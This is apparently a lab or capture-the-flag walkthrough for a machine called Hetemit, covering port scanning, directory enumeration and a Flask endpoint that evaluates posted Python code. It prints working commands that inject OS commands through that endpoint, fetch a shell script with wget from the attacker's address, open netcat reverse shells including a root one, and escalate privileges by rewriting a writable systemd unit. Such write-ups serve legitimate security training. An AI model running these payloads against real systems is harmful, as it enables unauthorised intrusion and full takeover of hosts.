##### Tags: `Writable file`  `SUID-l`  `Python Flask`  `Web-enum`

# 🐧Hetemit🐧
## Enumeration
Nmap
```
(ming㉿kali)-[~/Downloads]
└─$ nmap -p- -T4 -sV 192.168.129.117

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 17:31 AEDT
Nmap scan report for 192.168.129.117
Host is up (0.24s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
```

Found port 50000 running http with python  
Then use Gobuster to find subdirectory and got /verfiy
```
┌──(ming㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://192.168.129.117:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.129.117:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/verify               (Status: 200) [Size: 8]
```

Use curl to get more info and the website looks running python code
```
┌──(ming㉿kali)-[~/Downloads]
└─$ curl -i http://192.168.129.117:50000/verify
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:10:42 GMT

{'code'}                                                                                                                  
```

verify it with a simple math and it works
```
The web looks running the code with python   
┌──(ming㉿kali)-[~/Downloads]
└─$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=5*5"                                    
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:07:12 GMT

25
```                                  
## Initial foothold  

Use python code to execute command whoami to confirm we have RCE

```
Use python code to execute command whoami to confirm we have RCE
$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('whoami').read()"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 7
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:20:19 GMT

cmeeks
```
Upload a reverse shell
```
$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('wget http://192.168.45.167/shell.sh -O shell.sh').read()"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:23:32 GMT
```
Got reverse shell back
```
┌──(ming㉿kali)-[~/Downloads]
└─$ nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.129.117] 36674
sh: cannot set terminal process group (1392): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
cmeeks
sh-4.4$ 
```
## Privilege escalation
```
Run linpeas and found we have write permission over a pythonapp.service  
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd      
You have write privileges over /etc/systemd/system/pythonapp.service   
```
The pythonapp.service is a script systemd service unit file.   
It is used by Linux to manage how a background application starts, stops, and restarts automatically.
```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```
We can change the script user to root to get the root shell
```
[cmeeks@hetemit system]$ cat pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```
Then reboot the server to get root
```
[cmeeks@hetemit system]$ sudo -l
sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
[cmeeks@hetemit system]$ sudo /sbin/reboot
```
```
┌──(ming㉿kali)-[~/Downloads]
└─$ curl -i http://192.168.129.117:50000/verify -X POST --data "code=__import__('os').popen('nc 192.168.45.167 80 -e /bin/bash').read()"
```
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.129.117] 41766
id
uid=0(root) gid=0(root) groups=0(root)
```
